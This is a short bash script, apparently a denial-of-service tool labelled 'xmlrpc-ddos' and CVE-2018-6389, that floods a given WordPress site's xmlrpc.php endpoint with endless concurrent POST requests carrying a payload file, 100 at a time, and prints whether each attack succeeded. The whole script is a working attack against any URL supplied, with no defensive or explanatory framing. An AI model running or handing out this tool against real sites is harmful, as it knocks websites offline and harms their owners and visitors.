#!/bin/bash

grey=$(printf '\x1b[1;30m'); red=$(printf '\x1b[1;31m'); green=$(printf '\x1b[1;32m')
yellow=$(printf '\x1b[1;33m'); default=$(printf '\x1b[1;0m')

limit=100

function banner() {
    echo "+-------------------+"
    echo "|    ${grey}xmlrpc-ddos${default}    |"
    echo "|   ${yellow}CVE-2018-6389${default}   |"
    echo "+-------------------+"
}

function attack() {
    if [[ $(curl -i -s -k -X POST "${1}/xmlrpc.php" -H "Content-Type: text/html" --data-binary "@payload.txt") =~ "parse error" ]]; then
        echo "${green}[+] Attacking ${default}${1} ${green}SUCCESS${default}"
    else
        echo "${red}[-] Attacking ${default}${1} ${red}FAILED, maybe down or not vuln.${default}"
    fi
}

if [[ ${#@} != "1" ]]; then
    clear; echo "Usage: $0 <url>"
    exit 0 > /dev/null 2>&1
else
    clear; validation="[a-zA-Z0-9]+\.[a-zA-Z0-9]+.*"
    if [[ $1 =~ $validation ]]; then
        banner; echo ""
        while :
        do
        ((x=x%limit)); ((x++==0)) && wait
            attack $1 &
        done
    else
        echo "Example: (https://xxxxxx.xxx)/(http://xxxxxx.xxx)"; exit 0 > /dev/null 2>&1
    fi
fi